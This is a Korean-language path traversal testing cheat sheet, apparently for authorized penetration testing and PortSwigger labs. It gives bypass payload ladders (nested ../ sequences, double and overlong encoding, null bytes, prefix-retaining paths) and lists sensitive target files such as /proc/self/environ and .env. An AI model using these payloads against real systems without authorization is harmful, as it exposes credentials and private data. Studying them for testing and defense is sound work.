+++
date = '2026-07-01T10:00:00+09:00'
draft = false
title = '[Playbook] Path Traversal 진단 Cheat Sheet'
summary = "Path Traversal 진단 중 입력이 경로 조립에 쓰이는지 판별하고, 걸려 있는 검증의 종류에 맞춰 다음 우회 시도를 선택하기 위한 Playbook"
toc = true
tags = ["Path Traversal", "Filter Bypass", "Playbook", "Cheat Sheet", "Testing Workflow"]
+++

---

이 문서는 Path Traversal 진단 중 **입력이 파일 경로 조립에 참여하는지 확인하고, 걸려 있는 검증의 종류를 판별해 다음 시도를 고르기 위한 빠른 참고서**다. 검증별 상세 원리와 전체 풀이는 관련 Write-up과 [Path Traversal Note](/note/note-portswigger---path-traversal-%ED%86%A0%ED%94%BD-%EC%A0%95%EB%A6%AC-%EB%B0%8F-%EC%8B%A4%EC%8A%B5/)로 연결한다.

> 승인된 테스트 환경과 실습에서만 사용한다. 파일 읽기는 되돌릴 수 없는 정보 노출이므로, 성립 여부는 `/etc/passwd`처럼 무해한 마커 파일로만 확인하고 자격 증명·키·개인정보가 담긴 경로는 승인 범위를 확인한 뒤에 접근한다. 같은 파라미터가 쓰기 경로에도 쓰인다면 파일을 생성·덮어쓸 수 있으므로 읽기 검증만으로 멈춘다.

## 30초 진단 흐름

1. 요청 값 중 파일 이름·경로·확장자처럼 보이는 파라미터를 하나 고른다.
2. 존재하지 않는 값을 보내 **파일 부재 오류**가 나는지 확인한다(경로 조립 여부 판정).
3. 존재하는 파일에 `../`를 붙여 **차단인지 제거인지** 구분한다.
4. 이탈 수단을 상대경로 → 절대경로 → 중첩 → 인코딩 순으로 하나씩 시도한다.
5. 접두·확장자 요구가 있으면 그 형태를 남긴 채 최종 경로만 바꾼다.

| 관찰 결과 | 판단 | 다음 단계 |
| --- | --- | --- |
| `../../../etc/passwd`가 그대로 통함 | 검증 없음 | 성립 확정. 대상 파일 확장 |
| `../` 포함 시 오류·거부 | 차단(reject) 방식 | 절대경로·인코딩으로 패턴 회피 |
| `../file.jpg`가 `file.jpg`로 응답 | 제거(sanitize) 방식 | `....//` 중첩 시퀀스 |
| `....//`도 무력화됨 | 재귀 제거 | 이중 인코딩 `%252e%252e%252f` |
| 요청 값에 전체 경로가 들어 있음 | 접두 검증 가능성 | 기준 경로 유지 후 탈출 |
| 확장자를 바꾸면 거부됨 | 확장자 검증 | null 바이트 `%00.jpg` |
| 검증 실패와 파일 부재의 응답이 다름 | 오라클 확보 | 응답 차이로 통과 조건 좁히기 |
| 값이 숫자·ID로만 구성됨 | 매핑 테이블 방식 | 경로 조립이 아닐 수 있음. 다른 지점 탐색 |

## 1. 파일 참조 지점 찾기

파일명이 URL에 그대로 보이는 경우만 후보가 아니다. 값이 경로의 일부가 되는 모든 지점을 수집한다.

| 후보 지점 | 흔한 파라미터 형태 | 확인 포인트 |
| --- | --- | --- |
| 이미지·썸네일 로더 | `?filename=`, `?image=`, `?file=` | 확장자가 값에 노출되는지 |
| 첨부파일 다운로드 | `?doc=`, `?path=`, `?name=` | 원본 파일명이 그대로 쓰이는지 |
| 템플릿·테마·언어 선택 | `?lang=`, `?theme=`, `?view=` | 값 뒤에 확장자가 자동으로 붙는지 |
| 로그·리포트 조회 | `?date=`, `?report=` | 날짜 문자열이 파일명이 되는지 |
| 업로드 처리 | `filename` 필드, `Content-Disposition` | 저장 경로에 원본 이름이 쓰이는지 |
| 쿠키·JSON·헤더 | 세션에 담긴 파일 경로, `X-` 커스텀 헤더 | 쿼리 외 전송 경로도 동일하게 조립되는지 |
| 아카이브 전개 | ZIP·TAR 내부 엔트리 이름 | Zip Slip 성립 여부 |

- 확장자가 값에 드러나 있는 파라미터가 1순위다. 애플리케이션이 확장자를 붙이는 경우 `?lang=en` → `en.properties`처럼 뒤가 고정되므로 null 바이트나 잘림이 필요해진다.
- 값이 순수한 숫자 ID라면 매핑 테이블 방식일 가능성이 높다. 그래도 존재하지 않는 ID의 오류 응답을 한 번 확인해 파일 부재 오류가 새는지 본다.

## 2. 경로 조립 여부 판정

취약점을 찾기 전에 그 값이 파일 경로가 되기는 하는지부터 확정한다. 대조군을 세 개 만들어 응답을 비교한다.

| 요청 | 기대되는 응답 | 의미 |
| --- | --- | --- |
| 정상 파일명 | 파일 내용 | 기준선 |
| 존재하지 않는 파일명 | 파일 부재 오류 | 값이 실제 경로 조회에 사용됨 |
| 파라미터 자체 삭제 | 파라미터 누락 오류 | 검증 실패 응답과 구분할 기준 |

- 세 응답이 모두 같다면 값이 경로에 쓰이지 않거나 오류가 통일되어 있는 것이다. 응답 길이와 처리 시간까지 비교한 뒤 다음 지점으로 넘어간다.
- 검증 실패가 "파라미터 누락"으로 표시되는 구현이 있다. 이 경우 **파일 부재 오류가 나는 값 = 검증 통과**이므로 그 자체가 강력한 오라클이 된다.
- 응답이 항상 `200`에 이미지 `Content-Type`이면 상태 코드로는 구분되지 않는다. `Content-Length`와 본문 원문으로 판정한다.

## 3. 검증 방식 판별

존재하는 파일에 무해한 접두를 붙여 응답을 본다. 이 한 번의 요청이 이후 모든 시도의 방향을 정한다.

```http
GET /image?filename=../12.jpg HTTP/2
```

| 응답 | 검증 방식 | 진행 방향 |
| --- | --- | --- |
| 오류·거부 | 차단(reject) | 패턴 자체를 피한다 — 절대경로, 인코딩 |
| `12.jpg`가 정상 반환 | 제거(sanitize) | 제거 결과를 이용한다 — `....//` |
| `12.jpg`가 반환되며 앞 경로도 유효 | 검증 없음 | 바로 이탈 시도 |

- 이 구분을 건너뛰면 어느 쪽이 막혔는지 알 수 없는 실패만 쌓인다. 반드시 먼저 확정한다.
- 차단 방식이라면 `..`만 보는지 `../`까지 보는지도 확인한다. `..%2f`가 통하면 구분자만 검사 대상에서 빠진 것이다.

## 4. 이탈 수단 사다리

아래 순서로 하나씩 올라간다. 각 항목은 독립적이므로 하나가 막혀도 나머지를 모두 확인한다.

| 순서 | 페이로드 | 통하면 확인되는 것 | 관련 실습 |
| --- | --- | --- | --- |
| 1 | `../../../etc/passwd` | 검증 없음 | [simple case](/write-up/portswigger/path-traversal/write-up-portswigger---file-path-traversal-simple-case/) |
| 2 | `/etc/passwd` | 절대경로 우회 | [absolute path bypass](/write-up/portswigger/path-traversal/write-up-portswigger---file-path-traversal-traversal-sequences-blocked-with-absolute-path-bypass/) |
| 3 | `....//....//....//etc/passwd` | 비재귀 제거 | [stripped non-recursively](/write-up/portswigger/path-traversal/write-up-portswigger---file-path-traversal-traversal-sequences-stripped-non-recursively/) |
| 4 | `..%2f..%2f..%2fetc/passwd` | 구분자만 인코딩해도 통과 | — |
| 5 | `%252e%252e%252f` 반복 + `etc/passwd` | 검증 이후 추가 디코딩 | [superfluous URL-decode](/write-up/portswigger/path-traversal/write-up-portswigger---file-path-traversal-traversal-sequences-stripped-with-superfluous-url-decode/) |
| 6 | `..%c0%af..%c0%af..%c0%afetc/passwd` | 오버롱 UTF-8 허용 | — |
| 7 | `..\..\..\windows\win.ini` | Windows 구분자 | — |
| 8 | `/var/www/images/../../../etc/passwd` | 접두 검증 | [validation of start of path](/write-up/portswigger/path-traversal/write-up-portswigger---file-path-traversal-validation-of-start-of-path/) |
| 9 | `../../../etc/passwd%00.jpg` | 확장자 검증 + null 바이트 | [null byte bypass](/write-up/portswigger/path-traversal/write-up-portswigger---file-path-traversal-validation-of-file-extension-with-null-byte-bypass/) |

제거 방식일 때 쓸 수 있는 중첩 변형은 다음과 같다. 제거 대상이 `../`인지 `..`인지, 역슬래시도 구분자로 처리되는지에 따라 통하는 형태가 달라진다.

| 입력 | 제거 대상 | 제거 후 |
| --- | --- | --- |
| `....//` | `../` | `../` |
| `..././` | `./` | `../` |
| `....\/` | `..\` | `../` |
| `....\\` | `..\` | `..\` |

- 단일 URL 인코딩이 통하지 않는 것은 정상이다. 웹 서버가 쿼리 문자열을 애플리케이션에 넘기기 전에 이미 디코딩하므로 필터는 복원된 `../`를 본다. 인코딩 계열은 **디코딩이 검증 이후에 한 번 더 일어날 때만** 의미가 있다.
- `../`의 개수는 기준 디렉터리 깊이 이상이면 된다. 루트에서 `..`는 루트를 가리키므로 넉넉하게 붙여도 결과가 달라지지 않는다.
- 페이로드를 바꿀 때는 한 번에 하나만 바꾼다. 인코딩과 중첩을 동시에 적용하면 실패 원인을 분리할 수 없다.

## 5. 부가 검증 우회

이탈 자체는 되는데 다른 조건 때문에 거부되는 경우다.

| 요구 조건 | 확인 방법 | 우회 형태 |
| --- | --- | --- |
| 기준 경로로 시작해야 함 | `/etc/passwd`와 `/base/nothing.jpg`의 응답 비교 | `/base/../../../etc/passwd` |
| 특정 확장자로 끝나야 함 | 확장자만 바꿔 거부 여부 확인 | `...%00.jpg`, 경로 뒤 `?`·`#` 절단 |
| 확장자가 서버에서 자동으로 붙음 | 값 뒤에 고정 문자열이 붙는지 확인 | null 바이트로 뒷부분 절단 |
| 파일명에 디렉터리 구분자 불가 | `%2f`·`\`·`%5c` 각각 시도 | 허용되는 구분자 탐색 |

- 접두 검증은 정규화 전 문자열을 검사하는 결함이다. 기준 경로를 **그대로 남긴 채** 뒤에서 빠져나가는 것이 요령이다.
- null 바이트는 런타임에 의존한다. PHP 5.3.4, Java 7u40 이후로는 예외가 발생하므로 통하지 않는다고 해서 다른 우회까지 포기하지 않는다.
- 확장자 검증이 걸린 지점에서는 애초에 허용 확장자를 가진 민감 파일(백업 `.jpg`, 로그 등)이 기준 디렉터리 밖에 있는지도 함께 본다.

## 6. 대상 파일 선택

성립 확인은 무해한 파일로, 영향도 산정은 승인 범위 안에서 진행한다.

| 목적 | Linux · Unix | Windows |
| --- | --- | --- |
| 성립 확인 | `/etc/passwd` | `C:\windows\win.ini` |
| 호스트 식별 | `/etc/hostname` | `C:\windows\system32\drivers\etc\hosts` |
| 프로세스 정보 | `/proc/self/cmdline` | — |
| 환경 변수·시크릿 | `/proc/self/environ` | — |
| 애플리케이션 설정 | `WEB-INF/web.xml`, `.env`, `config.php` | `web.config` |

- 깊이를 모를 때는 `/etc/passwd`처럼 절대경로가 확정된 파일로 먼저 확인하고, 상대 위치가 필요한 설정 파일은 그다음에 시도한다.
- `/proc/self/environ`은 환경 변수에 담긴 자격 증명이 그대로 노출되므로 심각도 산정에는 결정적이지만, 그만큼 취급에 주의가 필요하다. 승인 범위를 먼저 확인한다.
- 컨테이너 환경이라면 파일 시스템 자체가 좁아 `/etc/passwd`가 있어도 얻을 것이 적을 수 있다. 애플리케이션 루트 기준의 상대 경로를 함께 시도한다.

## 7. 특수·예외 상황

아래 항목은 일반 흐름에 맞지 않을 때만 확인한다.

| 상황 | 짧은 판단 기준 | 관련 글 |
| --- | --- | --- |
| 같은 파라미터가 저장 경로에도 쓰임 | 읽기가 아니라 쓰기 프리미티브. 심각도가 크게 오름 | [Galaxy S24 Quick Share 사례](/review/review-samsung-galaxy-s24---pwn2own-ireland-2024-white-paper-%EB%B6%84%EC%84%9D/) |
| 리다이렉트 목적지에 경로가 들어감 | `../`로 목적지를 벗어나 다른 엔드포인트 지정 가능 | [client-side redirect](/write-up/portswigger/csrf/write-up-portswigger---samesite-strict-bypass-via-client-side-redirect/) |
| WAF에서만 차단됨 | 백엔드가 보는 값과 WAF가 보는 값의 차이를 만든다 | [superfluous URL-decode](/write-up/portswigger/path-traversal/write-up-portswigger---file-path-traversal-traversal-sequences-stripped-with-superfluous-url-decode/) |
| ZIP 업로드 후 자동 전개 | 엔트리 이름에 `../` 포함 여부(Zip Slip) | — |
| 응답이 항상 200 이미지 | `Content-Length`와 본문 원문으로 판정 | — |
| 경로가 URL이 될 수도 있음 | `file://`·`http://` 스킴 처리 시 SSRF·LFI로 확장 | — |
| 심볼릭 링크가 기준 디렉터리에 있음 | 문자열 정규화만으로는 걸러지지 않음 | — |

## Quick Checklist

- [ ] 파일 이름·경로·확장자가 값에 드러나는 파라미터를 모두 수집했는가?
- [ ] 존재하지 않는 값의 오류 응답으로 경로 조립 여부를 확인했는가?
- [ ] 검증 실패 응답과 파일 부재 응답을 구분할 기준을 확보했는가?
- [ ] 필터가 차단인지 제거인지 먼저 확정했는가?
- [ ] 상대경로·절대경로·중첩·인코딩·역슬래시를 각각 독립적으로 시도했는가?
- [ ] 단일 인코딩 실패를 인코딩 계열 전체의 실패로 오해하지 않았는가?
- [ ] 접두·확장자 요구가 있다면 그 형태를 남긴 채 최종 경로만 바꿨는가?
- [ ] 페이로드를 한 번에 하나씩만 바꿔 실패 원인을 분리했는가?
- [ ] 성립 확인을 무해한 마커 파일로 끝내고 승인 범위를 넘지 않았는가?
- [ ] 같은 파라미터가 쓰기 경로에도 쓰이는지 확인했는가?
